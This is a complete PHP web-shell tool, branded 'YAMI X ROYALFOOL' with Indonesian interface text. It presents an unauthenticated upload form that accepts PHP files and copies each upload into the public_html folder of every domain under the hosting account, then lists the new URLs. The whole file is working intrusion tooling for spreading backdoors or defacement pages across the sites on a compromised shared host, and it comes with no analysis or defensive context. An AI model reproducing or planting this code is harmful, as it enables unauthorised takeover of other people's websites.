<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["file"])) {
    
    $path = getcwd();
    $source = $_FILES["file"]["tmp_name"];
    $filename = $_FILES["file"]["name"];
    
    if (preg_match('/^\/home\/([^\/]+)\/domains\//', $path, $matches)) {
        $user = $matches[1];
        $dir_path = "/home/$user/domains/";
        
        if ($dh = opendir($dir_path)) {
            echo "<h3>Hasil Upload:</h3>";
            
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..' && is_dir($dir_path . $file)) {
                    $upload_dir = $dir_path . $file . "/public_html/";
                    
                    if (is_dir($upload_dir)) {
                        if (copy($source, $upload_dir . $filename)) {
                            echo "✓ http://$file/$filename<br>";
                        }
                    }
                }
            }
            closedir($dh);
            echo "<br><a href=''>Upload Lagi</a>";
        }
    }
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>YAMI X ROYALFOOL</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .container { max-width: 400px; margin: 0 auto; }
        input, button { padding: 10px; margin: 5px 0; width: 100%; }
        button { background: #4CAF50; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>YamiFoolXRoyalFool</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" accept=".php" required>
            <button type="submit">upload aku senpai</button>
        </form>
    </div>
</body>
</html>
<?php } ?>
